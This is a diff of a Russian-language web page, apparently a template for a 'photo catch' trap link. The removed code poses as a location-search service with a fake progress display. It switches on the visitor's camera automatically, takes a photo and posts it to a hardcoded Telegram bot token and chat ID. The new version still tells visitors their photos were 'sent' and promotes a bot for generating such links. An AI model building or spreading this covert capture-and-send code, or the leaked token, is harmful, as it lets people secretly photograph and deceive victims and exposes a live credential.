@@ -1,277 +1,151 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Поиск местоположения</title>
+    <title>Камера</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
-            color: white;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            overflow: hidden;
-        }
-        
-        .container {
-            max-width: 600px;
-            padding: 30px;
-            background: rgba(0, 0, 0, 0.7);
-            border-radius: 20px;
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);
-        }
-        
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-        }
-        
-        .loading {
-            display: flex;
-            justify-content: center;
-            margin: 30px 0;
-        }
-        
-        .spinner {
-            width: 80px;
-            height: 80px;
-            border: 8px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1.5s linear infinite;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
-        .progress-container {
-            width: 100%;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            margin: 30px 0;
-            overflow: hidden;
-        }
-        
-        .progress-bar {
-            height: 20px;
-            background: linear-gradient(90deg, #00c9ff, #92fe9d);
-            width: 0%;
-            border-radius: 10px;
-            transition: width 3s ease-in-out;
-        }
-        
-        .message {
-            font-size: 1.2rem;
-            line-height: 1.6;
-            margin: 20px 0;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        #permissionButton {
-            background: linear-gradient(90deg, #ff416c, #ff4b2b);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            border-radius: 50px;
-            cursor: pointer;
-            margin-top: 20px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            transition: transform 0.3s, box-shadow 0.3s;
-        }
-        
-        #permissionButton:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-        }
-        
-        .camera-feed {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: -1;
-            opacity: 0.2;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: rgb(245, 245, 245); }
+        #message { margin-top: 20px; padding: 15px; display: none; }
+        .photos-container { display: flex; justify-content: center; gap: 20px; margin-top: 20px; }
+        .photo { max-width: 45%; border-radius: 10px; }
+        #unsupported { margin-top: 40px; padding: 20px; background: rgb(255, 234, 234); border: 1px solid rgb(255, 90, 90); color: rgb(204, 0, 0); border-radius: 8px; font-size: 1.2em; display: none; }
+        #camera-container { margin: 20px auto; max-width: 500px; }
+        #camera { width: 100%; background: #000; border-radius: 10px; }
+        .controls { margin: 15px 0; }
+        button { padding: 10px 20px; font-size: 16px; margin: 0 5px; cursor: pointer; background: #6441a5; color: white; border: none; border-radius: 5px; }
+        button:hover { background: #7d5bbe; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Ищем место по фото, подождите...</h1>
-        
-        <div class="loading">
-            <div class="spinner"></div>
-        </div>
-        
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        
-        <div class="message">
-            <p>Анализируем геоданные и визуальные маркеры...</p>
-            <p>Сравниваем с базой из 14 млн локаций</p>
-            <p id="statusText">Инициализация системы распознавания</p>
-        </div>
-        
-        <button id="permissionButton" class="hidden">АКТИВИРОВАТЬ СКАНИРОВАНИЕ</button>
+    <div id="unsupported">
+        Браузер не поддерживается,<br>
+        откройте через любой другой.
     </div>
-
-    <video id="camera" class="camera-feed" autoplay playsinline></video>
+    
+    <div id="camera-container" style="display: none;">
+        <video id="camera" autoplay playsinline></video>
+        <div class="controls">
+            <button id="switchCamera">Переключить камеру</button>
+            <button id="capture">Сфотографировать</button>
+        </div>
+    </div>
+    
+    <div id="message">
+        Фото успешно отправлены.<br>
+        Сделать такую же ссылку:<br>
+        <a href="https://t.me/photocatchbot">https://t.me/photocatchbot</a>
+        <div id="photos-container" class="photos-container"></div>
+    </div>
+    
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Настройки (ЗАМЕНИТЕ НА СВОИ!)
-        const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
-        const CHAT_ID = "1224978194";
-        
-        const progressBar = document.getElementById('progressBar');
-        const statusText = document.getElementById('statusText');
-        const permissionButton = document.getElementById('permissionButton');
-        const camera = document.getElementById('camera');
-        
-        // Симуляция процесса поиска
-        let progress = 0;
-        const progressInterval = setInterval(() => {
-            progress += Math.random() * 10;
-            if (progress >= 100) {
-                progress = 100;
-                clearInterval(progressInterval);
-            }
-            progressBar.style.width = `${progress}%`;
-        }, 300);
-        
-        // Сообщения статуса
-        const messages = [
-            "Инициализация системы распознавания",
-            "Калибровка геодатчиков",
-            "Анализ визуальных маркеров",
-            "Сопоставление с картографической базой",
-            "Финализация результатов"
-        ];
-        
-        let messageIndex = 0;
-        const messageInterval = setInterval(() => {
-            statusText.textContent = messages[messageIndex];
-            messageIndex = (messageIndex + 1) % messages.length;
-        }, 3000);
-        
-        // Автозапуск камеры
-        setTimeout(() => {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        camera.srcObject = stream;
-                        setTimeout(() => captureAndSend(stream), 3000);
-                    })
-                    .catch(() => {
-                        // Показываем кнопку, если автоматический доступ не сработал
-                        permissionButton.classList.remove('hidden');
-                        statusText.textContent = "Требуется разрешение на сканирование";
-                    });
-            } else {
-                permissionButton.classList.remove('hidden');
-                statusText.textContent = "Ваш браузер не поддерживает сканирование";
-            }
-        }, 1500);
-        
-        // Обработчик кнопки разрешения
-        permissionButton.addEventListener('click', () => {
-            permissionButton.classList.add('hidden');
-            statusText.textContent = "Активация системы сканирования...";
+        document.addEventListener('DOMContentLoaded', async () => {
+            const unsupported = document.getElementById('unsupported');
+            const message = document.getElementById('message');
+            const cameraContainer = document.getElementById('camera-container');
+            const cameraElement = document.getElementById('camera');
+            const switchBtn = document.getElementById('switchCamera');
+            const captureBtn = document.getElementById('capture');
+            const photosContainer = document.getElementById('photos-container');
             
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    camera.srcObject = stream;
-                    setTimeout(() => captureAndSend(stream), 2000);
-                })
-                .catch(error => {
-                    statusText.textContent = "Ошибка доступа к камере!";
-                    console.error("Camera error:", error);
-                });
-        });
-        
-        // Функция захвата и отправки фото
-        function captureAndSend(stream) {
-            statusText.textContent = "Захват изображения...";
+            // Проверка поддержки браузером
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                unsupported.style.display = 'block';
+                return;
+            }
             
-            // Даем камере дополнительное время для инициализации
-            setTimeout(() => {
-                try {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = camera.videoWidth;
-                    canvas.height = camera.videoHeight;
-                    const context = canvas.getContext('2d');
-                    
-                    // Для Telegram-браузера - дополнительная задержка
-                    const isTelegramBrowser = navigator.userAgent.includes("Telegram");
-                    if (isTelegramBrowser) {
-                        setTimeout(() => {
-                            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
-                            processImage(stream, canvas);
-                        }, 1000);
-                    } else {
-                        context.drawImage(camera, 0, 0, canvas.width, canvas.height);
-                        processImage(stream, canvas);
-                    }
-                } catch (error) {
-                    console.error("Capture error:", error);
-                    statusText.textContent = "Ошибка захвата изображения!";
+            let currentStream = null;
+            let currentDeviceId = null;
+            let devices = [];
+            let usingFrontCamera = true;
+            
+            // Получение списка камер
+            async function getCameraDevices() {
+                devices = await navigator.mediaDevices.enumerateDevices();
+                return devices.filter(device => device.kind === 'videoinput');
+            }
+            
+            // Запуск камеры
+            async function startCamera(deviceId) {
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
                 }
-            }, 500);
-        }
-        
-        // Обработка и отправка изображения
-        function processImage(stream, canvas) {
-            statusText.textContent = "Обработка изображения...";
+                
+                const constraints = {
+                    video: deviceId ? 
+                        { deviceId: { exact: deviceId } } : 
+                        { facingMode: usingFrontCamera ? "user" : "environment" }
+                };
+                
+                try {
+                    currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    cameraElement.srcObject = currentStream;
+                    cameraContainer.style.display = 'block';
+                    message.style.display = 'none';
+                } catch (error) {
+                    console.error('Ошибка доступа к камере:', error);
+                    alert('Не удалось получить доступ к камере');
+                }
+            }
             
-            canvas.toBlob(blob => {
-                statusText.textContent = "Отправка данных на сервер...";
+            // Переключение камеры
+            async function switchCamera() {
+                const cameras = await getCameraDevices();
+                if (cameras.length < 2) {
+                    alert('Доступна только одна камера');
+                    return;
+                }
                 
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'geo_scan.jpg');
+                usingFrontCamera = !usingFrontCamera;
+                await startCamera();
+            }
+            
+            // Съемка фото
+            function capturePhoto() {
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
                 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        statusText.textContent = "Локация успешно определена!";
-                    } else {
-                        statusText.textContent = "Ошибка анализа данных. Попробуйте позже.";
-                    }
-                })
-                .catch(error => {
-                    console.error("Send error:", error);
-                    statusText.textContent = "Ошибка сети!";
-                })
-                .finally(() => {
-                    // Выключаем камеру
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    // Плавное завершение
-                    setTimeout(() => {
-                        progressBar.style.width = '100%';
-                        statusText.textContent = "Готово! Результаты отправлены.";
-                    }, 1000);
-                });
-            }, 'image/jpeg', 0.95);
-        }
+                canvas.width = cameraElement.videoWidth;
+                canvas.height = cameraElement.videoHeight;
+                context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
+                
+                // Создание элемента фото
+                const photo = new Image();
+                photo.src = canvas.toDataURL('image/png');
+                photo.classList.add('photo');
+                
+                // Очистка контейнера и добавление фото
+                photosContainer.innerHTML = '';
+                photosContainer.appendChild(photo);
+                
+                // Остановка камеры
+                currentStream.getTracks().forEach(track => track.stop());
+                
+                // Показ сообщения
+                cameraContainer.style.display = 'none';
+                message.style.display = 'block';
+            }
+            
+            // Инициализация
+            try {
+                const cameras = await getCameraDevices();
+                if (cameras.length === 0) {
+                    alert('Камеры не найдены');
+                    return;
+                }
+                
+                await startCamera();
+                
+                switchBtn.addEventListener('click', switchCamera);
+                captureBtn.addEventListener('click', capturePhoto);
+                
+            } catch (error) {
+                console.error('Ошибка инициализации:', error);
+                unsupported.style.display = 'block';
+            }
+        });
     </script>
 </body>
 </html>
